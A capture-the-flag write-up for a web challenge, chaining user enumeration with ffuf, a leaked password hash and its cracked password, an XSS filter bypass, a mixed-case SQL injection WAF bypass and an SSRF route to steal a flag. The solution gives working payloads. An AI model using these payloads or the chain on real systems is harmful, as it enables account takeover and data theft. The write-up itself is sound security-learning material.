#### Bankroll
- points earned: 973
#### Where's the flag?
- The flag is loaded into each container's environ vars via a `.env` file.
- It is only referenced in the `internal-app` container where is it loaded into the `secrets` table.
- Based on this I'm thinking that one of the following might be true
	- I can use a vulnerability that results in a code/command execution to read the environ vars
	- an sql injection vulnerability in `internal-app` will allow me to read the flag from the `secrets` table

#### Investigating the app UX
- From a UX perspective the app contains a way to login but no way to register
- Note: Although the challenge description stated that the username was changed on the live target I still took some time to confirm that for `erin`, `admin`, and `FLASK_SECRET_KEY` were changed.

#### Investigating account access
- The `/login` route appears to be OK but I did find a couple things a little weird:
	- The logic indicates that the password might be stored as a `sha256` or `md5` hash.  This didn't have anything to do with the solution but it stuck out because I don't really see this.
	- I became curious of the flow which is (1) query db for username and (2) ff a user is found, hash the password and compare it with the stored value.
		- At this point I tested against whether or not a timing attack might be viable, however, it was not.  But I wonder if a `bcrypt` alg would provide enough time to pull this off.
- I then started to play with the `/forgot-password` route and found some juice.
	- The problem with this route is that when a user submits a `forgot-password` the response contains the password hash for that user.
	- So at this point I'm wondering if I can enumerate a valid user, get their hash, and hope they used a weak password.
	- I used `ffuf` for this and confirmed it worked locally, then tried it on the live target.
		```bash
		ffuf -X POST -w ~/opt/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt -H 'Content-Type: application/json' -d '{"username":"FUZZ"}'  -u 'http://23.179.17.92:5000/forgot-password' -mc all -fc 404
		```
	- The live target returned a valid user `zack`:
		```json
		{
			"account": {
				"password_hash": "02d48447b8518150ec55ff678bc19372bedab79658e12bcbeb8023a400008df5",
				"role": "user",
				"username": "zack"
			},
			"message": "Account found. Recovery information has been sent.",
			"status": "ok"
		}
		```
	- I used `crackstation.net` to crack the hash to `ryLis@1024`.
	- Nice! so we're authenticated as a regular user.

#### Investigating the app an unprivileged user
- Looks like a banking app but the only functionality I see is `Team Notes`.
- When I post a note, however, it does not show in the page.
- I confirmed that the not does show for the `admin` user.
- So, moving forward, I need see if there is an XSS in the notes logic.

#### Looking for XSS
- Looking at the `dashboard.html` logic I can see that the note content is loaded with the `safe` template filter.  In other words, an XSS might be possilble here.
	```python
	<div class="note-content">{{ note.content | safe }}</div>
	```
- Looking in the logic for the `/notes` route I can see that a function `sanitize_note` is used on the note content.
	```python
	def sanitize_note(content):
	    content = re.sub(r'<script.*?>.*?</script>', '', content, flags=re.IGNORECASE | re.DOTALL)
	    content = re.sub(r'<details[\s\S]*?>[\s\S]*?</details>', '', content, flags=re.IGNORECASE)
	    content = re.sub(r'<details[^>]*>', '', content, flags=re.IGNORECASE)
	    content = re.sub(r'</details>', '', content, flags=re.IGNORECASE)
	    content = re.sub(r'javascript:', '', content, flags=re.IGNORECASE)
	    content = re.sub(r'on(load|error|click|submit|focus|toggle|begin|end|mouse\w+|key\w+|input|change|drag\w*|drop|scroll|wheel|pointer\w*)=', '', content, flags=re.IGNORECASE)
	    return content
	```
- I pulled this function out into a test script to play with some bypasses.  I was able to confirm that (1) it is removing dangerous and (2) `re.sub` is not recursive.  This means that I can bypass this filter with something like:
	```python
	<scr<script>bark</script>ipt>
		alert(1)
	</script>
	```
- So far this is pretty good, but there's still some missing pieces.

#### Looking for SQLi
- I start looking at the `interal-app` code for ways to get the flag from the db.
- The first thing I notice is that `render_template_string` is being used so I might be able to just get an SSTI to read environ vars.  However, there's no user input going into the content before it is rendered so this is not a viable solution.
- Looking at the `/search` route I see the query below which should be vulnerable to SQLi.
	```python
	sql = "SELECT id, name, department, status FROM employees WHERE name = '" + q + "'"
	```
- On the local challenge I edit the `docker-compose.yml` file to expose `internal-app` so I can play with it.
- From a UX perspective this app has a basic search functionality that can be used to search employee names.
- Looking back in the code I see there's a function `waf_check` being used to validate the search parameter.
	```python
	KEYWORDS = {
	    "union", "select", "from", "where",
	    "drop", "insert", "delete", "update",
	    "exec", "execute", "load_file",
	    "outfile", "dumpfile"
	}
	
	def is_bad_casing(word: str) -> bool:
	    return word.islower() or word.isupper()
	
	
	def waf_check(value: str) -> bool:
	    for word in re.findall(r'\b\w+\b', value):
	        if word.lower() in KEYWORDS:
	            if is_bad_casing(word):
	                return True
	
	    if "--" in value:
	        return True
	
	    return False
	```
- I copied this out to a test script to do some testing and found that there's an issue in the  `bad_casign` function.
	- The problem is that the logic here will cause `waf_check` to return `True` (yes, there filter found problems) if a keyword is all caps or all lowers
	- But it does cause issues if there are a combination of uppers and lowers.  Since something like `SeLeCt` is valid in an SQL query this can be used as the bypass.

#### The Missing Piece: `/devtools/fetch`
- Thinking about the pieces I have so far (authentication, XSS, SQLi) I could see that something was missing.
	- The XSS and the SQLi both live on different origins, so I'm going to run into a CORS issue if I try to have a `main-app` origin POST to an `internal-app` origin.
	- I check headers on the `internal-app` response confirm that the lack of a `Access-Control-Allow-Origin` header confirms that CORS will be an issue here.
	- At this point I'm thinking either of the following:
		- I need an XSLeak that I can use to expose the flag
		- There's a gadget in the app that I can use to leak the flag.
- I start looking back at the code and come across the `/devtools` route which I somehow forgot about.
- I logged into the local challenge application as the admin user to play with this route.
	- It takes a url
	- does a `urllib.request.urlopen`
	- and returns the response to the user
- This is the missing piece.

#### Planning an Attack
- log into the app as the `zack` user
- post a note with XSS that
	- sends a request to `/devtools/fetch` with a URL that triggers the SQLi
	- fetch the results back to an exfil server
- During initial testing of this I ran into an issue that I overlooked where the note content cannot by more than 250 bytes.
	- To get around this I splt the XSS payload into 3 different notes.
	- Thinking about this right now, I probably could have just sourced the JS file from my own server. (this is probably the better approach lol)

#### Solution
- Fuzz the `/forgot-password` route for a valid user and hash.
	- `ffuf -X POST -w ~/opt/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt -H 'Content-Type: application/json' -d '{"username":"FUZZ"}'  -u 'http://23.179.17.92:5000/forgot-password' -mc all -fc 404`
- Crack the hash with `crackstation.net`
	- hash: `02d48447b8518150ec55ff678bc19372bedab79658e12bcbeb8023a400008df5`
	- password: `ryLis@1024`
- Login as  `zack`
- Post the following notes in this order:
	```html
	<scr<script></script>ipt>window.r.then(r=>r.text()).then((t)=>{console.log(t)})</script>
	
	<scr<script></script>ipt>window.r=fetch('/devtools/fetch',{method:'POST',headers:{'Content-Type':'application/json'},body:`{"url":"${window.u}"}`})</script>
	
	<scr<script></script>ipt>window.u="http://127.0.0.1:8080/search?q=meow'%20Union%20Select%201,2,3,secret%20From%20secrets%20Where%20id='1"</script>
	```
	- Note:  It looks like these are in the wrong order (window.u is defined after it is referenced), however the page shows notes from youngest to oldest so they will end up rendering in the reverse order.
- Exfil server will receive a request with base64 encoded content that contains the flag